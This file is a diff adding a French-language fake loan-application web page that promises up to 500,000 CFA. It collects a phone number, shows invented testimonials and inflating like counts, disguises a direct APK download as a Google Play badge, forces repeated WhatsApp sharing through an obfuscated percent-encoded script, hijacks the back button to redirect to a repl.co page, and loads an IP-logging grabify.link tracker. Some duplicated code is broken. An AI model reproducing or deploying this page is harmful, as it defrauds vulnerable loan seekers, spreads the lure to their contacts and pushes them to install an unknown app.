@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: none; /* Caché par défaut */
+        }
+    </style>
+    <script>
+        // Fonction pour obtenir un cookie par son nom
+        function getCookie(name) {
+            const value = "; " + document.cookie;
+            const parts = value.split("; " + name + "=");
+            if (parts.length === 2) return parts.pop().split(";").shift();
+        }
+
+        // Fonction pour afficher ou cacher le contenu en fonction du cookie
+        function checkCookie() {
+            const fromPage1 = getCookie("fromPage1");
+            if (fromPage1 === "true") {
+                document.body.style.display = "block"; // Affiche le contenu si le cookie est présent
+            } else {
+                document.body.style.display = "none"; // Caché si le cookie n'est pas présent
+            }
+        }
+
+        // Vérifie le cookie lorsque la page est chargée
+        window.onload = function() {
+            checkCookie();
+        };
+    </script>
+</head>
+<body>
+<!DOCTYPE html>
+
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>DEMANDE DE PRÊT</title>
+    <link rel="shortcut icon" type="image/png" href="ii.jpeg">
+    <img src="https://lanouvelletribune.info/wp-content/uploads/2017/05/financement.jpg" alt="John" style="width:100%">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:image" content="https://lanouvelletribune.info/wp-content/uploads/2017/05/financement.jpg">
+    <meta property="og:title" content="DEMANDE DE PRET">
+    <meta property="og:description" content="Inscrivez-vous pour une demande de prêt et recevez le en 24h">
+    <meta property="og:url" content="https://www.pretenligne.com">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Funding Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template,
+Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design">
+    <!-- Styles CSS (à définir dans la balise <style>) -->
+
+    <style>
+        /* Styles here */
+
+        .blink {
+
+            animation: blink 1s steps(1, end) infinite;
+
+        }
+
+
+
+        @keyframes blink {
+
+            0% {
+
+                opacity: 1;
+
+            }
+
+            50% {
+
+                opacity: 0;
+
+            }
+
+            100% {
+
+                opacity: 1;
+
+            }
+
+        }
+    </style>
+
+    <style type="text/css">
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+        @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+        @import url("https://fonts.googleapis.com/css2?family=Indie+Flower&display=swap");
+        @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap");
+
+        * {
+
+            margin: 0;
+
+            padding: 0;
+
+            font-family: Poppins, Droid Arabic Naskh;
+
+            font-weight: normal;
+
+            box-sizing: border-box;
+
+
+
+
+
+        }
+
+        body {
+
+            font-family: Arial, sans-serif;
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            /* Ajout d'un dégradé de couleurs au fond de la page */
+            background-image: linear-gradient(to right, #ffffff, #ffffff);
+
+        }
+
+        a {
+
+            text-decoration: none;
+
+        }
+
+        .post {
+
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #666666;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px #abcdef;
+            /* Ajout d'une transition au conteneur principal */
+            transition: transform 0.3s ease-in-out;
+
+
+
+        }
+
+        .form-group {
+
+            margin-bottom: 20px;
+
+        }
+
+        .form-group label {
+
+            display: block;
+
+            font-weight: bold;
+
+            margin-bottom: 5px;
+
+        }
+
+        .form-group input[type="text"] {
+
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            /* Ajout d'une bordure pointillée aux champs de texte */
+            border-style: dotted;
+            /* Ajout d'une ombre interne aux champs de texte */
+            box-shadow: inset 0 -2px #ddd;
+
+        }
+
+        .post img {
+
+            width: 100%;
+            /* Ajout d'une transformation au logo */
+            transform: rotate(10deg);
+            /* Ajout d'une transition au logo */
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .post img:hover {
+            /* Ajout d'une transformation au logo au survol */
+            transform: rotate(-10deg);
+        }
+
+        .welcome {
+
+            font-size: 15px;
+
+        }
+
+        .amount,
+
+        #getname {
+
+            color: #098105;
+
+            text-decoration: none;
+
+        }
+
+        .done {
+
+            text-align: center;
+
+            color: #27ae60;
+
+        }
+
+        .tip {
+
+            font-size: 14px;
+
+        }
+
+        .title {
+
+            text-align: center;
+            /* Ajout d'une police cursive au titre */
+            font-family: "Indie Flower", cursive;
+            /* Ajout d'une taille de police plus grande au titre */
+            font-size: 36px;
+            /* Ajout d'une couleur plus vive au titre */
+            color: #098105;
+
+        }
+
+        .error {
+
+            display: none;
+
+            text-align: center;
+
+            font-size: 14px;
+
+            color: #e74c3c;
+
+        }
+
+        button {
+
+            display: block;
+            width: 200px;
+            height: 50px;
+            color: #fff;
+            border: none;
+            outline: none;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            padding: 0 10px;
+            margin: 10px auto;
+            background: rgb(0, 0, 0);
+            transition: background 0.3s ease, transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+
+        }
+
+        button:hover {
+
+            /* Ajout d'un dégradé de couleurs aux boutons au survol */
+            background: linear-gradient(to right, #098105, #27ae60);
+            /* Ajout d'une transformation aux boutons au survol */
+            transform: scale(1.1);
+            /* Ajout d'une ombre portée aux boutons au survol */
+            box-shadow: 0 2px 5px #27ae60;
+
+        }
+
+        .phone {
+
+            max-width: 400px;
+
+            margin: 10px auto;
+
+        }
+
+        .phone input {
+
+            width: 100%;
+
+            height: 50px;
+
+            padding: 10px;
+
+            outline: none;
+
+            border: 2px solid #cecece;
+
+            font-size: 14px;
+
+        }
+
+        #confirm {
+
+            width: 200px;
+
+            margin: 10px auto;
+
+            border-radius: 0px;
+
+        }
+
+        #loader {
+
+            text-align: center;
+
+        }
+
+        .spin {
+
+            width: 50px;
+
+            height: 50px;
+
+            background: transparent;
+
+            border: solid 8px rgb(0, 0, 0);
+
+            border-right-color: transparent;
+
+            border-radius: 50%;
+
+            margin: 10px auto;
+
+            animation: spin 0.3s linear infinite;
+
+        }
+
+        @keyframes spin {
+
+            100% {
+
+                transform: rotate(1turn);
+
+            }
+
+        }
+
+        #loader,
+
+        #info,
+
+        #checking,
+
+        #share,
+
+        #claim {
+
+            display: none;
+
+        }
+
+        .center {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+        }
+
+        .barr {
+
+            direction: ltr;
+
+            max-width: 400px;
+
+            margin: 10px auto;
+
+            box-sizing: border-box;
+
+        }
+
+        .fill {
+
+            position: relative;
+
+            display: inline-block;
+
+            width: calc(100% - 100px);
+
+            height: 35px;
+
+            padding: 2px;
+
+            border: 2px solid #098105;
+
+        }
+
+        #fill,
+
+        #fill2 {
+
+            background: #098105;
+
+            width: 0%;
+
+            height: 100%;
+
+        }
+
+        .percentage {
+
+            width: 100px;
+
+            float: right;
+
+            height: 35px;
+
+            font-size: 16px;
+
+            border: 2px solid #098105;
+
+        }
+
+        #percentage,
+
+        #percentage2 {
+
+            margin-left: 5px;
+
+        }
+
+        #check,
+
+        #check2 {
+
+            display: none;
+
+        }
+
+        .counter {
+
+            color: #7f7f7f;
+
+            font-size: 12px;
+
+            text-align: right;
+
+            padding: 10px 0 10px 2px;
+
+            border-bottom: 1px solid #ffffff;
+
+        }
+
+        .reactions {
+
+            display: inline-flex;
+
+            align-items: center;
+
+            float: left;
+
+        }
+
+        .counter img {
+
+            float: left;
+
+            width: 16px;
+
+            height: 16px;
+
+            border-radius: 50%;
+
+            border: 2px solid #000000;
+
+            box-sizing: content-box;
+
+        }
+
+        .like,
+
+        .love {
+
+            margin-right: -5px;
+
+        }
+
+        .like {
+
+            z-index: 2;
+
+        }
+
+        .love {
+
+            z-index: 1;
+
+        }
+
+        .bar {
+
+            display: table;
+
+            width: 100%;
+
+            border-bottom: 1px solid #000000;
+
+        }
+
+        .bar .react {
+
+            display: table-cell;
+
+            width: calc(100% / 3);
+
+            font-size: 12px;
+
+            color: #000000;
+
+            text-align: center;
+
+            padding: 10px 0;
+
+            cursor: pointer;
+
+        }
+
+        .comments {
+
+            direction: ltr;
+
+        }
+
+        .comment {
+
+            padding: 6px 0;
+
+            margin-top: 5px;
+
+        }
+
+        .comment img {
+
+            float: left;
+
+            width: 32px;
+
+            height: 32px;
+
+            border: none;
+
+            border-radius: 18px;
+
+            cursor: pointer;
+
+        }
+
+        .reply {
+
+            margin-left: 37px;
+
+        }
+
+        .single-container {
+
+            margin-left: 37px;
+
+            background: #f1f2f6;
+
+            padding: 10px;
+
+            border-radius: 15px;
+
+            font-size: 12px;
+
+        }
+
+        .single-container .user {
+
+            display: inline-block;
+
+            cursor: pointer;
+
+            color: #365899;
+
+            margin-bottom: 5px;
+
+        }
+
+        .single-container .text {
+
+            display: block;
+
+        }
+
+        .buttons {
+
+            font-size: 12px;
+
+            font-weight: bold;
+
+            margin: 10px 0 0 47px;
+
+            color: #000000;
+
+        }
+
+        .action {
+
+            cursor: pointer;
+
+        }
+
+        .action:hover {
+
+            text-decoration: underline;
+
+        }
+
+        .input {
+
+            padding: 6px 12px 12px;
+
+        }
+
+        .input input {
+
+            width: 100%;
+
+            background: #f1f2f6;
+
+            padding: 10px;
+
+            border-radius: 15px;
+
+            border: 0;
+
+            outline: none;
+
+        }
+
+        .A {
+
+            text-align: center;
+
+            background-color: white;
+            background-image: linear-gradient(to right, #ff0500, #ff0500);
+
+        }
+
+        .rating {
+
+            color: #fdd835;
+    </style>
+
+</head>
+
+
+
+<body>
+
+    <div class="barr" width="100%">
+
+        <center>
+
+            <marquee direction="" width="350" height="35" behavior="alternate" style="border:solid">
+
+                <marquee class="horizontal_marque" direction="left">
+                    <font color="#000000">OFFRE SPÉCIALE POUR LES DEMANDES EN LIGNE ! NE MANQUEZ PAS CETTE OPPORTUNITÉ.
+                    </font>
+                </marquee>
+
+            </marquee>
+
+
+
+        </center>
+
+    </div>
+
+    <!-- En-tête de la page -->
+
+    <div class="A">
+
+        <font color="#FFFFFF">En ce moment, jusqu'à:</font>
+        </b> <span class="blink"><b>
+                <font color="black">500 000 CFA</font>
+            </b> </span>
+        <font color="#FFFFFF">de prêt.</font>
+        <br>
+        <font color="#FFFFFF"> Bienvenue sur le site de demande de prêt en ligne. Veuillez entrer votre numéro de
+            téléphone
+            pour commencer. </font><br /> <b>
+
+
+    </div>
+
+    <div class="post" width="100%">
+
+
+
+        <div id="intro">
+
+
+
+            <p class="welcome">
+
+
+
+
+
+                <center><b>
+                        <font color="FFFFFF">Numéro de téléphone :</font>
+                    </b></center>
+
+                <br>
+
+
+
+                <center><input type="text" placeholder="Entrez votre numéro Ex: 01xxxxxxxx" id="name" name="Phone"
+                        style="font-width: 244px; height: 56px; font-size: 18px; width: 330px;" required
+                        onkeypress="return numberonly(event);"></center><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+                <button id="go">Vérification</button>
+
+        </div>
+
+        <div id="loader">
+
+            <div>
+
+                Veuillez patienter pendant que nous vérifions vos informations...</div>
+
+            <div class="spin"></div>
+
+            <div id="num">0%</div>
+
+        </div>
+
+        <div id="info">
+
+
+
+
+
+
+
+            <center>
+
+                <p>
+                    <font color="FFFFFF">Formulaire de demande de prêt</font>
+                </p>
+
+            </center>
+
+            <br>
+
+            <center>
+
+                <div class="form-group">
+
+                    <label for="loan_amount">Montant du prêt :</label>
+
+                    <select name="loan_amount" id="loan_amount" class="_5dba" style="width: 330px; height: 56px;"
+                        required>
+
+                        <option value="0" selected disabled>---CHOISISSEZ ICI---</option>
+
+                        <option value="1">5000 FCFA</option>
+
+                        <option value="2">10000 FCFA</option>
+
+                        <option value="3">50000 FCFA</option>
+
+                        <option value="4">100000 FCFA</option>
+
+                        <option value="5">500000 FCFA</option>
+
+                        <!-- Ajoutez d'autres options de montant de prêt selon vos besoins -->
+
+                    </select>
+
+                </div>
+
+                <div class="form-group">
+
+                    <label for="loan_duration">Durée du prêt (en mois) :</label>
+
+                    <select name="loan_duration" id="loan_duration" class="_5dba" style="width: 330px; height: 56px;"
+                        required>
+
+                        <option value="0" selected disabled>---CHOISISSEZ ICI---</option>
+
+                        <option value="6">3 mois</option>
+
+                        <option value="12">4 mois</option>
+
+                        <option value="24">5 mois</option>
+
+                        <option value="36">6 mois</option>
+
+                        <!-- Ajoutez d'autres options de durée de prêt selon vos besoins -->
+
+                    </select>
+
+                </div>
+
+            </center>
+
+            <br>
+
+            <!-- Votre contenu supplémentaire ici -->
+
+
+
+
+
+
+
+
+
+            <button id="confirm">Soumettre</button>
+
+        </div>
+
+        <p class="error">Désolé, votre numéro est manquant <a
+                href="https://pretenligne.com-l.repl.co/finalisation.html/">
+                <b>
+                    <font color="#14948F">AJOUTER UN NUMÉRO</font>
+                </b></a></p>
+
+    </div>
+
+    <div id="checking">
+
+        <center>
+            <font color="black">Transmission du dossier...</font>
+        </center>
+
+        <div class="barr">
+
+            <div class="fill">
+
+                <div id="fill"></div>
+
+            </div>
+
+            <div class="percentage center">
+
+                <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+
+                <span id="check"><i class="fa fa-check-circle"></i></span>
+
+                <span id="percentage"></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div id="share">
+
+        <font color="#000000">
+
+            <p class="tip">Nous sommes ravis de vous informer que votre demande de prêt au numéro <span
+                    id="getname"></span> a
+                été approuvée.</p>
+
+            <p class="tip">Cependant, afin de finaliser votre demande de prêt, veuillez suivre la dernière étape en
+                cliquant
+                sur Google Play pour obtenir notre application et suivez les instructions fournies.</p>
+
+        </font>
+        <br>
+
+        <div style="display: flex; justify-content: center;">
+            <div style="width: 47%; max-width: 25em;">
+                <a id="downloadLink"
+                    href='https://download1078.mediafire.com/q0c6xp5h14ng1Ejcok641-Nd3r1OmsZ1Q9RI3BEriq0F88hWWZpKJPrOdqD1wj9JVvm989L334KL6woYqlrf63snIifxAwhD1SMKNLsbcAPFmGMM9bqBKcXt8Y9jw4d29gMx3KbGQeBHFLz95drzgRjcHnbfUPjHkDoCV3XKUZCQGME/ra8r7uufko6aj0i/Le+Pr%C3%AAt.apk'>
+                    <img alt='Disponible sur Google Play'
+                        src='https://www.oneci.ci/assets/images/fr_badge_web_generic.svg' width="100%" />
+                </a>
+            </div>
+        </div>
+        <br>
+
+        <p class="tip"> En partageant notre lien jusqu'à atteindre 100 %, vous bénéficierez du privilège de voir votre
+            demande de prêt placée en priorité en haut de la liste d'attente, ce qui accélérera le traitement de votre
+            requête. (Cliquez sur l'icône "PARTAGER" ci-dessous).</p>
+
+
+
+
+
+        <button id="whatsapp">PARTAGER</button>
+
+        <div class="barr">
+
+            <div class="fill">
+
+                <div id="fill2"></div>
+
+            </div>
+
+            <div class="percentage center">
+
+                <span><i class="fa fa-spinner fa-pulse"></i></span>
+
+                <span id="percentage2">0%</span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div id="claim">
+
+        <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+
+        <p class="title"> Félicitations ! Votre demande a été placée en priorité en haut de la liste d'attente, et elle
+            sera
+            traitée dans les plus brefs délais. Nous mettons tout en œuvre pour répondre à votre demande le plus
+            rapidement
+            possible. </p>
+
+        <br />
+
+    </div>
+
+    <div class="comments">
+
+        <div class="counter">
+
+            <div class="reactions">
+
+                <img class="like" src="https://i.imgur.com/g6cV61A.png" /> <img class="love"
+                    src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://i.imgur.com/sSMYbTT.png" />
+                <span id="likes">134K</span>
+
+            </div>
+
+            <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+
+        </div>
+
+        <div class="bar">
+
+            <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span
+                class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i
+                    class="fa fa-share"></i> Share</span>
+
+        </div>
+
+        <div>
+
+            <div class="comment">
+
+            </div>
+
+        </div>
+
+        <div class="comment">
+
+            <img src="https://i.imgur.com/xp1ER6K.jpg" />
+
+            <div class="single-container">
+
+                <span class="user"> Joseph Emmanuel </span>
+
+                <br>
+                <p>Note: <span class="rating">★★★★★</span>
+
+                    <span class="text">
+
+                        Je ne peux pas exprimer à quel point je suis soulagé et heureux d'avoir pu obtenir ce prêt. Ça
+                        faisait des
+                        semaines que je cherchais une solution.
+
+                    </span>
+
+            </div>
+
+            <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span
+                    class="action liked">Like</span> · <span class="action">Reply</span></div>
+
+        </div>
+
+        <div class="comment">
+
+            <img
+                src="https://1.bp.blogspot.com/--d2BBdGugW8/XpdlXRvB-HI/AAAAAAAAAJ8/xcstaPQkWoszaizR_rkK2Nc5L7xN2o7WACLcBGAsYHQ/s1600/FB_IMG_15869726679037399.jpg" />
+
+            <div class="single-container"><span class="user">David Anthony</span><br>
+                <p>Note: <span class="rating">★★★★☆</span></p> <span class="text"> Je viens de recevoir incroyable.
+                    merci
+                </span>
+            </div>
+
+            <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span
+                    class="action liked">Like</span> · <span class="action">Reply</span></div>
+
+        </div>
+
+        <div class="comment reply">
+
+            <img
+                src="https://1.bp.blogspot.com/-UQW1DxDR9Ko/XpdlghF8wJI/AAAAAAAAAKU/EXuIMhMGNeED6BwLWbxkGgtBe3HL0RTTACLcBGAsYHQ/s1600/FB_IMG_15869730921979436.jpg" />
+
+            <div class="single-container"><span class="user">Amahle John </span><br>
+                <p>Note: <span class="rating">★★★★★</span> <span class="text"> Le mien est en attente car je viens de
+                        finir de
+                        partager jusqu'a 100%. S'il vous plaît aidez-moi! </span>
+            </div>
+
+            <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span
+                    class="action liked">Like</span> · <span class="action">Reply</span></div>
+
+        </div>
+
+        <div class="comment">
+
+            <img
+                src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" />
+
+            <div class="single-container"><span class="user">Bonolo</span><br>
+                <p>Note: <span class="rating">★★★☆☆</span> <span class="text">merci pour le pret d'argent du mois passé,
+                        mais
+                        j'essais de prendre encore je suis toujours sur liste d'attente parceque j'ai oublier de
+                        partager. aider moi
+                        svp </span>
+            </div>
+
+            <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span
+                    class="action liked">Like</span> · <span class="action">Reply</span></div>
+
+        </div>
+
+        <div class="input"><input placeholder="Write a comment..." /></div>
+
+    </div>
+
+    </div>
+
+    </div>
+
+
+
+    <!-- Inclusion de la bibliothèque jQuery (une librairie JavaScript) -->
+
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+    <script type="text/javascript">
+        var time = 0;
+        window.setInterval(function () {
+            time = time + 1;
+            $(".t1").html(time + 1 + "m");
+            $(".t2").html(time + 2 + "m");
+            $(".t3").html(time + 4 + "m");
+        }, 6e4);
+        var likes = 134,
+            comments = 23,
+            shares = 12;
+        window.setInterval(function () {
+            likes = likes + Math.floor(Math.random() * 3);
+            comments = comments + Math.floor(Math.random() * 2);
+            shares = shares + Math.floor(Math.random() * 2);
+            $("#likes").html(likes + "K");
+            $("#comments").html(comments + "K comments");
+            $("#shares").html(shares + "K shares");
+        }, 5e3);
+        $(".liked").click(function () {
+            if ($(this).hasClass("selected")) {
+                $(this).removeClass("selected");
+                $(this).html("Like");
+            } else {
+                $(this).addClass("selected");
+                $(this).html("Unlike");
+            }
+        });
+    </script>
+
+
+    <script>
+        document.getElementById("downloadLink").addEventListener("click", function (event) {
+            event.preventDefault(); // Empêcher le lien de rediriger immédiatement
+
+            setTimeout(function () {
+                var message = "Le téléchargement est terminé ! Faites glisser la barre de notification vers le bas, puis appuyez sur nomapp.apk pour procéder à l'installation.";
+                alert(message);
+            }, 10000); // 10000 ms = 10 secondes
+        });
+    </script>
+
+
+
+
+
+    <script type="text/javascript">
+
+        $(document).ready(function () {
+            $("#go").click(function () {
+                var phoneNumber = $("#name").val();
+                if (!isValidPhoneNumber(phoneNumber)) {
+                    $(".error").text("Veuillez saisir un numéro valide.");
+                    $(".error").fadeIn(500);
+                } else {
+                    $(".error").fadeOut(500);
+                    $("#intro").fadeOut(0);
+                    $("#loader").fadeIn(1000);
+                    var i = 0;
+                    var interval = setInterval(function () {
+                        $("#num").text(i + "%");
+                        i += 1;
+                        if (i >= 100) {
+                            clearInterval(interval);
+                            $("#loader").fadeOut(0);
+                            $("#info").fadeIn(1000);
+                        }
+                    }, 50);
+                }
+            });
+            $("#confirm").click(function () {
+                if ($("#name").val().length < 4) {
+                    $(".error").fadeIn(500);
+                } else {
+                    $("#info").fadeOut(0);
+                    $("#checking").fadeIn(1000);
+                    var i = 0;
+                    var interval = setInterval(function () {
+                        i += 1;
+                        $("#percentage").text(i + "%");
+                        $("#fill").css("width", i + "%");
+                        if (i == 50) {
+                            i = 49;
+                            setTimeout(function () {
+                                i = 50;
+                            }, 1000);
+                        }
+                        if (i >= 100) {
+                            clearInterval(interval);
+                            $("#load").fadeOut(0);
+                            $("#check").fadeIn(0);
+                            setTimeout(function () {
+                                $("#checking").fadeOut(0);
+                                $("#share").fadeIn(1000);
+                                $("#getname").html($("#name").val());
+                            }, 500);
+                        }
+                    }, 50);
+                }
+            });
+            $(document).click(function () {
+                if ($("#name").is(":focus")) {
+                    $(".error").fadeOut(500);
+                }
+            });
+            $("#name").focus(function () {
+                $(".error").fadeOut(500);
+            });
+
+            function isValidPhoneNumber(phoneNumber) {
+                var phoneNumberPattern = /^0\d{9}$/; // Starts with 0 and has 10 digits
+                return phoneNumberPattern.test(phoneNumber);
+            }
+        });
+    </script>
+
+
+
+
+
+    <script>
+        var text1 = "*PROFITEZ DÈS MAINTENANT DE NOTRE OFFRE SPÉCIALE POUR LES DEMANDES DE PRÊT EN LIGNE !*%0A%0AVous avez des projets que vous souhaitez réaliser, mais vous manquez de financement ? *Ne cherchez pas plus loin ! Notre plateforme de prêt en ligne offre une solution rapide et sécurisée.* %0A%0AEn ce moment, jusqu'à: *500 000 CFA* de prêt.%0A%0A Lancez votre demande dès maintenant.👇%0A*https://pretenligne.com-l.repl.co/*%0A%0A",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Quelque chose ne va pas!\nLes postes ne sont pas calculés. Vous l'avez peut-être partagé avec le même ami ou groupe plus d'une fois, veuillez le partager à nouveau",
+            abcde = "https://pretenligne.com-l.repl.co/finalisation.html/",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+    <script>
+        <!-- code by OD -->
+        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+    </script>
+
+
+
+    <script>
+        window.onhashchange = function () { jp(); };
+        function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+        function jp() {
+            fh();
+        }
+        setTimeout('hh();', 500);
+        function fh() {
+            location.href = "https://pretenligne.com-l.repl.co/finalisation.html/";
+        }
+        function goon() {
+            location.href = "https://pretenligne.com-l.repl.co/finalisation.html/";
+        }
+    </script>
+
+
+
+    <script>
+        window.onhashchange = function () { jp(); };
+        function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+        function jp() {
+            fh();
+        }
+        setTimeout('hh();', 500);
+        function fh() {
+            location.href = "https://pretenligne.com-l.repl.co/finalisation.html/;
+        }
+        function goon() {
+            location.href = "https://pretenligne.com-l.repl.co/finalisation.html/;
+        }
+    </script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://grabify.link/EZHAK9";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+
+    <img src="https://www.canada-academy.com/wp-content/uploads/2019/07/Comptabilite%CC%81-et-finance.jpg" alt="John"
+        style="width:100%">
+    <br />
+
+    </div>
+
+    <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
+</body>
+
+</html>
+</body>
+</html>
